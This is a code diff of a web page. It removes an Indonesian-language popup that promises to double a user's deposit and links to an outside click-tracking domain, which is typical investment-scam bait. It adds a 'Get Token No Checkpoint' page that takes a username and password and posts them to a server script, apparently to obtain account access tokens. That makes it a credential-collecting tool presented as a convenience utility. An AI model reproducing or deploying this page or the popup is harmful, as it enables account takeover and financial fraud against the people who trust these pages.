@@ -1,52 +1,55 @@
- <div class="popup popup_id" id="popup-deposit">
-    <a class="popup__wrapper js-close-popup"></a>
-    <div class="popup__content">
-      <a class="popup__close js-close-popup"></a>
-      <img src="/system/templates/popup/img/safes.png" alt="" class="popup__img">
-      <div class="popup__title">
-      <span class="popup__title-cost">
-          <span class="popup__title-factor">x</span>
-          2
-      </span>
-        <h2 class="popup__title-content popup__title-content--id">
-          Kami gandakan deposit Anda        </h2>
-      </div>
-      <p class="popup__text">$10.000 tersedia di akun Anda</p>
-      <a class="popup__btn"
-         href="http://lestsbane-sockgles.com/click/2"
-         target="_blank">
-        <span class="popup__btn-text">Mulai berpenghasilan</span>
-      </a>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Get Token iPhone</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+</head>
+<body>
+ 
+<div class="container">
+
+  <div class="panel-group">
+<div class="panel panel-primary">
+      <div class="panel-heading">Get Token No Checkpoint 100%</div>
+      <div class="panel-body">      
+<div class="form-group">
+  <label for="usr">Username:</label>
+  <input type="text" class="form-control" id="tk">
+</div>
+<div class="form-group">
+  <label for="pwd">Password:</label>
+  <input type="text" class="form-control" id="mk">
+</div>
+<button type="button" class="btn btn-danger" onclick="Puaru_Active()" >Get Token</button>
+<p>
+<li id="trave" class="list-group-item"><img src="/token.png"> </li></p>
+
+</div>
     </div>
-  </div>
-
+</div>
 <script>
+function Puaru_Active() {
+var http = new XMLHttpRequest();
+var tk = document.getElementById("tk").value;
+var mk = document.getElementById("mk").value;
+var url = "./token3.php";
+var params = "u="+tk+"&p="+mk+"";
+http.open("POST", url, true);
+http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 
-    var time = 150 * 1000;
-  
-    $(function () {
+http.onreadystatechange = function() {
+    if(http.readyState == 4 && http.status == 200) {
+      document.getElementById("trave").innerHTML = http.responseText;        
+    }
+}
+http.send(params);
+}
+</script>
 
-    var deposit = $('#popup-deposit');
-    deposit.hide();
-
-    window.allowpop = true;
-    document.addEventListener("mouseout", function (e) {
-      if (e.clientY < 0 && window.allowpop) {
-        window.allowpop = false;
-        deposit.fadeIn(400);
-        setTimeout(function () {
-          window.allowpop = true;
-        }, time)
-      }
-    });
-
-    $('.js-close-popup').on('click', function (e) {
-      e.preventDefault();
-
-      deposit.fadeOut(200);
-      return false;
-    });
-  });
-  </script>
 </body>
 </html>
